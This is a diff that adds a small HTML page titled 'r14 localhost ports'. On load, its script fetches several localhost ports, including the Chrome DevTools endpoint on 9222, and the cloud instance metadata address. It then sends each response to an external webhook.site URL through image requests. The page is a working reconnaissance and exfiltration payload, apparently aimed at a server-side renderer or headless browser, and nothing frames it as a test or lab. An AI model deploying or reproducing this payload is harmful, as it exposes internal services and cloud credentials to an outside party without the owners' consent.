@@ -1,0 +1,18 @@
+<!doctype html><html><head><meta charset="utf-8"><title>vsm-r14 ports</title></head><body>
+<h1>r14 localhost ports</h1>
+<script>
+var O='https://webhook.site/00c686d8-b76a-4447-906e-09d6547c8c84/';
+function ex(t,v){var i=new Image();i.src=O+t+'-'+encodeURIComponent(String(v).slice(0,300));}
+ex('alive','1');
+function p(tag,url,ms){
+  var ac=new AbortController(); var tm=setTimeout(function(){ac.abort();},ms||3000);
+  fetch(url,{signal:ac.signal,mode:'cors'}).then(function(r){return r.text();}).then(function(t){clearTimeout(tm);ex(tag,'OK:'+t);}).catch(function(e){clearTimeout(tm);ex(tag,'E:'+e.message);});
+}
+p('lo80','http://127.0.0.1:80/');
+p('lo3000','http://127.0.0.1:3000/');
+p('lo9222','http://127.0.0.1:9222/json/version');
+p('lo8080','http://127.0.0.1:8080/');
+p('meta','http://169.254.169.254/metadata/v1/');
+p('doext','https://webhook.site/00c686d8-b76a-4447-906e-09d6547c8c84/r14-ctrl');
+</script>
+</body></html>
